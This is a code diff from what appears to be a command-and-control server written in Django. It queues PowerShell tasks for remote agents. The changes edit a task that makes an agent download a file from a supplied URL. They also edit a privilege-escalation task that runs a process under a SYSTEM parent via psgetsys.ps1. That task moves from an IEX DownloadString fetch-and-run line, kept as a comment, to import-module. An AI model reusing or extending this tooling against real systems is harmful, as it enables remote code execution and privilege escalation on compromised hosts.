@@ -72,7 +72,7 @@ def DownloadFileAsync(request):
         agentTask.save()
         url = request.POST['url']
         outpath = request.POST['outpath']
-        task = "(New-Object Net.WebClient).DownloadFileAsync('{url}', '{outpath}')".format(url, outpath)
+        task = "(New-Object Net.WebClient).DownloadFileAsync('{}', '{}')".format(url, outpath)
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
@@ -611,7 +611,7 @@ def tasklist (request):
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
         agentTask.save()
         
-        task = 'echo "++++++++++++++++++`r`n`t`r`n===============Task List===============";tasklist;echo "++++++++++++++++++`r`n`t`r`n"'
+        task = 'echo "++++++++++++++++++`r`n`t`r`n===============Task_List===============";tasklist;echo "++++++++++++++++++`r`n`t`r`n"'
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
@@ -631,7 +631,8 @@ def Exec_With_Prnt_Priv(request):
         psgetsysURL=request.POST['psgetsysURL']  #the PoCScript "psgetsys.ps1"
         system_pid = request.POST['system_pid']    
         path_to_execute = request.POST['path_to_execute']
-        task = "IEX(New-Object Net.WebClient).DownloadString('{}');[MyProcess]::CreateProcessFromParent({},'{}','')".format(psgetsysURL,system_pid,path_to_execute)
+        task = "import-module {} ;[MyProcess]::CreateProcessFromParent({},'{}','')".format(psgetsysURL,system_pid,path_to_execute)
+      #  task = "IEX(New-Object Net.WebClient).DownloadString('{}');[MyProcess]::CreateProcessFromParent({},'{}','')".format(psgetsysURL,system_pid,path_to_execute)
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
